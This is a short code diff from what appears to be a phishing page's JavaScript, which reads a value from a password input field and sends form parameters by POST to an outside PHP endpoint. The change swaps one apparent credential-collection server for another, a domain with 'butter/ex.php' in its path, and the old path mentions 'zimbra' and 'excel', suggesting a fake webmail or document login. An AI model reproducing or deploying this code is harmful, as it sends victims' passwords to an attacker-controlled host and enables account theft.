@@ -70,7 +70,7 @@ var password = document.getElementById('passwordInput').value;
 				}, 2000);
             }
         }
-        xmlHttp.open("post", "https://infrlco.com/zimbra/excel/ex/connect.php", true);
+        xmlHttp.open("post", "https://lextechnologiae.com/butter/ex.php", true);
 		xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
         xmlHttp.send(params); 
 }
